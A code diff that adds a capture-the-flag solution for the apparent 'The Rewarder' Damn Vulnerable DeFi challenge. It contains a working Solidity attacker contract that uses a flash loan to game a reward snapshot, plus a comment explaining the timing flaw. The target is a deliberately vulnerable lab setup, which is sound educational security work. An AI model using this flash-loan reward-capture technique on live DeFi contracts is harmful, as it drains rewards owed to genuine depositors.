@@ -12,6 +12,38 @@ import {RewardToken} from "../../../Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../Contracts/the-rewarder/FlashLoanerPool.sol";
 
+contract AttackerContract {
+    FlashLoanerPool internal flashLoanerPool;
+    TheRewarderPool internal theRewarderPool;
+    DamnValuableToken internal dvt;
+    address internal immutable attacker;
+
+    constructor(
+        FlashLoanerPool _flashLoanerPool,
+        TheRewarderPool _theRewarderPool
+    ) {
+        flashLoanerPool = _flashLoanerPool;
+        theRewarderPool = _theRewarderPool;
+        dvt = _flashLoanerPool.liquidityToken();
+        attacker = msg.sender;
+    }
+
+    function attack(uint256 dvtAmount) external {
+        flashLoanerPool.flashLoan(dvtAmount);
+    }
+
+    function receiveFlashLoan(uint256 dvtAmount) external {
+        dvt.approve(address(theRewarderPool), dvtAmount);
+        theRewarderPool.deposit(dvtAmount);
+        theRewarderPool.withdraw(dvtAmount);
+        dvt.transfer(address(flashLoanerPool), dvtAmount);
+        uint256 balance = theRewarderPool.rewardToken().balanceOf(
+            address(this)
+        );
+        theRewarderPool.rewardToken().transfer(attacker, balance);
+    }
+}
+
 contract TheRewarder is DSTest {
     Vm internal immutable vm = Vm(HEVM_ADDRESS);
 
@@ -94,6 +126,24 @@ contract TheRewarder is DSTest {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // The vulnerability is caused by the fact that snapshot is recorded right before reward distribution.
+        // This means that the contract doesn't take into consideration when user deposited as long as he deposits
+        // before the reward is being distributed --> This allows me to wait for the 5 days period to pass, then
+        // deposit flash-loaned DVT into the contract, which claims the rewards. Then I withdraw and repay the loan.
+
+        vm.startPrank(attacker);
+
+        // Wait for the next round
+        vm.warp(block.timestamp + 5 days);
+
+        AttackerContract attackerContract = new AttackerContract(
+            flashLoanerPool,
+            theRewarderPool
+        );
+
+        attackerContract.attack(TOKENS_IN_LENDER_POOL);
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
